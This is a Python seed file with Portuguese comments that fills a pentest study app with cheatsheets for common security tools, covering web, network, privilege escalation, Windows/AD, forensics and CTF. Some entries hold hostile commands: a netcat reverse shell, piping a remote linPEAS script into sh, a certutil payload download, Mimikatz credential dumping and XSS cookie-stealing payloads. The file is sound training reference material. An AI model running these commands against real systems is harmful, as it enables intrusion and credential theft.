"""Seed do TryHackMe Lab: conjunto inicial de ferramentas, comandos e
cheatsheets REAIS e genéricos de cada categoria (Nmap, Gobuster, linPEAS,
Mimikatz, Volatility, Ghidra etc.) — o ferramental padrão da indústria que
qualquer pentester/estudante usa, não conteúdo do TryHackMe.

Roda só uma vez: `thm_lab._load()` chama `seed_items()` quando o arquivo
de dados ainda não existe, para a área nascer útil em vez de vazia.
"""

SEED = [
    # ---------------------------------------------------------- Web Security
    {"title": "Gobuster — força bruta de diretórios", "category": "Web Security", "kind": "command",
     "description": "Descoberta de diretórios/arquivos e subdomínios.",
     "content": "gobuster dir -u http://ALVO -w /usr/share/wordlists/dirb/common.txt -x php,txt,html\n"
                "gobuster dns -d ALVO.thm -w /usr/share/wordlists/subdomains.txt\n"
                "gobuster vhost -u http://ALVO -w wordlist.txt",
     "tags": ["gobuster", "enum", "web"], "url": "https://github.com/OJ/gobuster"},
    {"title": "ffuf — fuzzing web", "category": "Web Security", "kind": "command",
     "description": "Fuzzer rápido em Go para parâmetros, diretórios e vhosts.",
     "content": "ffuf -u http://ALVO/FUZZ -w wordlist.txt\n"
                "ffuf -u http://ALVO/api?FUZZ=1 -w params.txt -fc 404",
     "tags": ["ffuf", "fuzzing", "web"], "url": "https://github.com/ffuf/ffuf"},
    {"title": "Burp Suite — interceptação de requisições", "category": "Web Security", "kind": "cheatsheet",
     "description": "Fluxo básico: Proxy > Intercept, Repeater para reenviar/alterar, Intruder para brute force.",
     "content": "1. Configure o proxy do navegador para 127.0.0.1:8080\n"
                "2. Intercepte a requisição em Proxy > Intercept\n"
                "3. Envie para Repeater (Ctrl+R) para testar payloads manualmente\n"
                "4. Use Intruder para fuzzing automatizado de parâmetros",
     "tags": ["burp", "proxy", "web"], "url": "https://portswigger.net/burp"},
    {"title": "SQLmap — SQL Injection automatizada", "category": "Web Security", "kind": "command",
     "description": "Detecção e exploração de SQLi em ambiente autorizado.",
     "content": "sqlmap -u \"http://ALVO/item?id=1\" --batch --dbs\n"
                "sqlmap -u \"http://ALVO/item?id=1\" -D nome_db --tables\n"
                "sqlmap -u \"http://ALVO/login\" --data=\"user=a&pass=b\" --level=3 --risk=2",
     "tags": ["sqlmap", "sqli", "web"], "url": "https://sqlmap.org/"},
    {"title": "XSS — payloads básicos de teste", "category": "Web Security", "kind": "cheatsheet",
     "description": "Payloads clássicos para validar reflected/stored XSS em campo autorizado.",
     "content": "<script>alert(1)</script>\n<img src=x onerror=alert(1)>\n\"><svg onload=alert(1)>\n"
                "javascript:alert(document.cookie)",
     "tags": ["xss", "payload", "web"]},
    {"title": "CORS/CSP/Headers — checklist rápido", "category": "Web Security", "kind": "cheatsheet",
     "description": "O que checar manualmente antes de rodar o Web Analyzer do Cyber Lab.",
     "content": "- Access-Control-Allow-Origin: * + credentials = falha grave\n"
                "- CSP ausente ou com 'unsafe-inline'\n"
                "- Cookies sem HttpOnly/Secure/SameSite\n"
                "- Headers ausentes: X-Frame-Options, X-Content-Type-Options, HSTS",
     "tags": ["cors", "csp", "headers"]},

    # ---------------------------------------------------------- Network
    {"title": "Nmap — varredura essencial", "category": "Network", "kind": "command",
     "description": "Scans mais usados em labs de rede.",
     "content": "nmap -sC -sV -oN scan.txt ALVO\n"
                "nmap -p- --min-rate 5000 ALVO\n"
                "nmap -sU --top-ports 20 ALVO\n"
                "nmap --script vuln ALVO",
     "tags": ["nmap", "scan", "recon"], "url": "https://nmap.org/"},
    {"title": "Wireshark/tshark — captura de pacotes", "category": "Network", "kind": "cheatsheet",
     "description": "Filtros úteis para análise de tráfego em laboratório.",
     "content": "http.request\ntcp.port == 445\ndns\nftp\nfollow tcp stream: botão direito > Follow > TCP Stream\n"
                "tshark -r captura.pcap -Y http.request",
     "tags": ["wireshark", "tshark", "pcap"], "url": "https://www.wireshark.org/"},
    {"title": "enum4linux / smbclient — enumeração SMB", "category": "Network", "kind": "command",
     "description": "Enumeração de shares, usuários e políticas SMB.",
     "content": "enum4linux -a ALVO\nsmbclient -L //ALVO/ -N\nsmbmap -H ALVO\ncrackmapexec smb ALVO -u '' -p ''",
     "tags": ["smb", "enum", "windows"]},
    {"title": "Netcat — shells e transferência", "category": "Network", "kind": "cheatsheet",
     "description": "Listener, reverse shell e transferência de arquivos.",
     "content": "# listener\nnc -lvnp 4444\n# reverse shell (na máquina alvo)\nnc -e /bin/bash SEU_IP 4444\n"
                "# transferir arquivo\nnc -lvnp 4444 > arquivo   # receptor\nnc IP 4444 < arquivo      # remetente",
     "tags": ["netcat", "shell", "transfer"]},

    # ---------------------------------------------------------- Linux
    {"title": "LinEnum / linPEAS — enumeração de privesc", "category": "Linux", "kind": "command",
     "description": "Scripts de enumeração automática para escalada de privilégios em Linux.",
     "content": "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh\n"
                "./LinEnum.sh -t\nfind / -perm -4000 2>/dev/null   # SUID manual",
     "tags": ["linpeas", "privesc", "linux"], "url": "https://github.com/carlospolop/PEASS-ng"},
    {"title": "GTFOBins — abuso de binários SUID/sudo", "category": "Linux", "kind": "cheatsheet",
     "description": "Referência de binários Unix que podem ser abusados para escalar privilégio.",
     "content": "Consulte o binário permitido em sudo -l ou SUID e procure o mesmo nome no GTFOBins\n"
                "Ex.: find . -exec /bin/sh \\; -quit  (se find estiver no SUID/sudo)",
     "tags": ["gtfobins", "privesc", "linux"], "url": "https://gtfobins.github.io/"},
    {"title": "Checklist de Privilege Escalation Linux", "category": "Privilege Escalation", "kind": "cheatsheet",
     "description": "Roteiro manual antes/depois de rodar scripts automáticos.",
     "content": "sudo -l\ncat /etc/crontab\nfind / -writable -type d 2>/dev/null\n"
                "getcap -r / 2>/dev/null\nuname -a   # kernel exploits\nls -la /etc/passwd (writable?)",
     "tags": ["privesc", "linux", "checklist"]},

    # ---------------------------------------------------------- Windows
    {"title": "WinPEAS — enumeração Windows", "category": "Windows", "kind": "command",
     "description": "Enumeração automática de vetores de escalada em Windows.",
     "content": "winpeas.exe\nwhoami /priv\nsysteminfo\nwmic qfe list",
     "tags": ["winpeas", "privesc", "windows"], "url": "https://github.com/carlospolop/PEASS-ng"},
    {"title": "Mimikatz — extração de credenciais", "category": "Windows", "kind": "cheatsheet",
     "description": "Uso educacional em laboratório próprio/CTF — nunca em ambiente de terceiros.",
     "content": "privilege::debug\nsekurlsa::logonpasswords\nlsadump::sam",
     "tags": ["mimikatz", "credentials", "windows"], "url": "https://github.com/gentilkiwi/mimikatz"},
    {"title": "BloodHound — mapeamento de Active Directory", "category": "Windows", "kind": "cheatsheet",
     "description": "Coleta e visualização de caminhos de ataque em AD.",
     "content": "SharpHound.exe -c All\n# depois importe o .zip no BloodHound GUI e procure \"Shortest Path to Domain Admins\"",
     "tags": ["bloodhound", "ad", "windows"], "url": "https://github.com/BloodHoundAD/BloodHound"},
    {"title": "LOLBAS — abuso de binários nativos do Windows", "category": "Windows", "kind": "cheatsheet",
     "description": "Living Off The Land Binaries — binários legítimos abusáveis para execução/evasão.",
     "content": "Ex.: certutil -urlcache -split -f http://IP/payload.exe payload.exe",
     "tags": ["lolbas", "windows", "evasion"], "url": "https://lolbas-project.github.io/"},

    # ---------------------------------------------------------- OSINT
    {"title": "theHarvester — coleta de e-mails/subdomínios", "category": "OSINT", "kind": "command",
     "description": "Coleta passiva de e-mails, subdomínios e hosts.",
     "content": "theHarvester -d ALVO.com -b all", "tags": ["osint", "recon"],
     "url": "https://github.com/laramies/theHarvester"},
    {"title": "Shodan — busca de dispositivos expostos", "category": "OSINT", "kind": "cheatsheet",
     "description": "Motor de busca para dispositivos/serviços conectados à internet.",
     "content": "shodan search \"apache country:BR\"\nshodan host IP", "tags": ["shodan", "osint"],
     "url": "https://www.shodan.io/"},
    {"title": "Sherlock — busca de username em redes", "category": "OSINT", "kind": "command",
     "description": "Localiza contas com o mesmo username em várias plataformas.",
     "content": "python3 sherlock.py usuario", "tags": ["sherlock", "osint"],
     "url": "https://github.com/sherlock-project/sherlock"},

    # ---------------------------------------------------------- Cryptography
    {"title": "hashcat — quebra de hashes", "category": "Cryptography", "kind": "command",
     "description": "GPU cracking de hashes comuns.",
     "content": "hashcat -m 0 hashes.txt rockyou.txt        # MD5\n"
                "hashcat -m 1000 hashes.txt rockyou.txt     # NTLM\nhashcat -a 3 hash.txt ?a?a?a?a?a?a",
     "tags": ["hashcat", "crack"], "url": "https://hashcat.net/hashcat/"},
    {"title": "John the Ripper", "category": "Cryptography", "kind": "command",
     "description": "Quebra de senhas offline, formatos variados.",
     "content": "john --wordlist=rockyou.txt hashes.txt\njohn --show hashes.txt",
     "tags": ["john", "crack"], "url": "https://www.openwall.com/john/"},
    {"title": "CyberChef — cifra/decodificação", "category": "Cryptography", "kind": "cheatsheet",
     "description": "'Canivete suíço' web para Base64, XOR, RSA, hashes, etc.",
     "content": "Arraste os módulos From Base64 / XOR Brute Force / To Hex conforme o desafio.",
     "tags": ["cyberchef", "encoding"], "url": "https://gchq.github.io/CyberChef/"},

    # ---------------------------------------------------------- Forensics
    {"title": "Volatility — análise de memória", "category": "Forensics", "kind": "command",
     "description": "Framework de análise forense de dumps de memória RAM.",
     "content": "vol.py -f dump.mem imageinfo\nvol.py -f dump.mem --profile=PROFILE pslist\n"
                "vol.py -f dump.mem --profile=PROFILE netscan",
     "tags": ["volatility", "memory", "forensics"], "url": "https://www.volatilityfoundation.org/"},
    {"title": "Autopsy — forense de disco", "category": "Forensics", "kind": "cheatsheet",
     "description": "Análise de imagens de disco (timeline, arquivos deletados, artefatos).",
     "content": "1. New Case > adicionar imagem .dd/.E01\n2. Ingest Modules: Hash Lookup, Keyword Search, Timeline\n"
                "3. Ver Deleted Files e Timeline Analysis",
     "tags": ["autopsy", "disk", "forensics"], "url": "https://www.autopsy.com/"},
    {"title": "exiftool / binwalk / strings", "category": "Forensics", "kind": "cheatsheet",
     "description": "Metadados, extração de arquivos embutidos e strings legíveis.",
     "content": "exiftool arquivo.jpg\nbinwalk -e arquivo.bin\nstrings arquivo | grep -i flag",
     "tags": ["exiftool", "binwalk", "strings"]},

    # ---------------------------------------------------------- Reverse Engineering
    {"title": "Ghidra — engenharia reversa", "category": "Reverse Engineering", "kind": "cheatsheet",
     "description": "Análise estática de binários (NSA, open-source).",
     "content": "1. File > New Project\n2. Import File (o binário)\n3. Analyze (padrão) e leia o Decompile window",
     "tags": ["ghidra", "re"], "url": "https://ghidra-sre.org/"},
    {"title": "radare2 / r2 — análise de binário via CLI", "category": "Reverse Engineering", "kind": "command",
     "description": "Framework de RE em linha de comando.",
     "content": "r2 -A binario\n[0x...]> afl   # listar funções\n[0x...]> pdf @ main   # disassemble da main",
     "tags": ["radare2", "re"], "url": "https://rada.re/n/"},
    {"title": "gdb + pwndbg — debugging/exploração", "category": "Reverse Engineering", "kind": "command",
     "description": "Debugger para análise dinâmica e desenvolvimento de exploits.",
     "content": "gdb ./binario\n(gdb) break main\n(gdb) run\n(gdb) info registers",
     "tags": ["gdb", "pwndbg", "re"]},

    # ---------------------------------------------------------- Malware Analysis
    {"title": "Análise estática rápida de malware", "category": "Malware Analysis", "kind": "cheatsheet",
     "description": "Primeiros passos seguros em ambiente isolado (VM sem rede/snapshot).",
     "content": "file amostra\nstrings amostra | less\nexiftool amostra\n"
                "sha256sum amostra   # depois consulte em feeds de IOC",
     "tags": ["malware", "static-analysis"]},
    {"title": "Cuckoo/analise dinâmica — checklist", "category": "Malware Analysis", "kind": "cheatsheet",
     "description": "Regras básicas antes de detonar uma amostra suspeita.",
     "content": "- Sempre em VM isolada, sem rede real (rede fake/INetSim)\n- Snapshot antes de rodar\n"
                "- Monitorar processos (Process Monitor), registro e conexões de rede",
     "tags": ["malware", "dynamic-analysis", "sandbox"]},

    # ---------------------------------------------------------- SOC
    {"title": "MITRE ATT&CK — uso no triage", "category": "SOC", "kind": "cheatsheet",
     "description": "Mapeie o alerta para tática/técnica antes de escrever o relatório.",
     "content": "1. Identifique o comportamento observado\n2. Busque a técnica em attack.mitre.org\n"
                "3. Relacione com a tática (Initial Access, Execution, Persistence...)",
     "tags": ["mitre", "soc", "triage"], "url": "https://attack.mitre.org/"},
    {"title": "Playbook básico de triagem de alerta", "category": "SOC", "kind": "cheatsheet",
     "description": "Passo a passo genérico para o primeiro atendimento de um alerta SIEM.",
     "content": "1. Confirmar falso positivo x verdadeiro\n2. Isolar host se necessário\n"
                "3. Coletar evidências (logs, memória, hash)\n4. Escalar conforme severidade\n5. Documentar no ticket",
     "tags": ["soc", "ir", "triage"]},

    # ---------------------------------------------------------- Pentest
    {"title": "Metodologia PTES — visão geral", "category": "Pentest", "kind": "cheatsheet",
     "description": "Fases padrão de um pentest profissional.",
     "content": "1. Pre-engagement (escopo/autorização)\n2. Intelligence Gathering (OSINT)\n"
                "3. Threat Modeling\n4. Vulnerability Analysis\n5. Exploitation\n6. Post-Exploitation\n7. Reporting",
     "tags": ["pentest", "metodologia"], "url": "http://www.pentest-standard.org/"},
    {"title": "Metasploit — uso básico", "category": "Pentest", "kind": "command",
     "description": "Framework de exploração — só em alvo autorizado/laboratório.",
     "content": "msfconsole\nsearch nome_do_cve\nuse exploit/...\nset RHOSTS ALVO\nset PAYLOAD ...\nrun",
     "tags": ["metasploit", "exploitation"], "url": "https://www.metasploit.com/"},
    {"title": "Hydra — brute force de login", "category": "Pentest", "kind": "command",
     "description": "Brute force de serviços (SSH, FTP, login web) em ambiente autorizado.",
     "content": "hydra -l admin -P rockyou.txt ssh://ALVO\n"
                "hydra -l admin -P rockyou.txt ALVO http-post-form \"/login:user=^USER^&pass=^PASS^:Invalid\"",
     "tags": ["hydra", "bruteforce"], "url": "https://github.com/vanhauser-thc/thc-hydra"},

    # ---------------------------------------------------------- CTF
    {"title": "Checklist inicial de CTF (web)", "category": "CTF", "kind": "cheatsheet",
     "description": "Primeiros passos ao abrir um desafio web de CTF.",
     "content": "1. view-source: da página\n2. /robots.txt e /sitemap.xml\n3. Inspecionar cookies/localStorage\n"
                "4. Testar parâmetros óbvios com aspas/payloads simples\n5. Rodar gobuster/ffuf",
     "tags": ["ctf", "web", "checklist"]},
    {"title": "Checklist inicial de CTF (pwn/binário)", "category": "CTF", "kind": "cheatsheet",
     "description": "Primeiros passos ao abrir um binário de CTF.",
     "content": "file binario\ncheckmate binario   # ou checksec\nstrings binario | grep -i flag\n"
                "objdump -d binario | less",
     "tags": ["ctf", "pwn", "checklist"]},
]


def seed_items(add_item_fn):
    """Popula a base vazia. Recebe a função add_item() de thm_lab para não
    duplicar a lógica de persistência (thm_lab chama isto na primeira carga)."""
    for it in SEED:
        add_item_fn(
            title=it["title"], category=it["category"], kind=it.get("kind", "tool"),
            description=it.get("description", ""), content=it.get("content", ""),
            tags=it.get("tags", []), url=it.get("url", ""),
        )
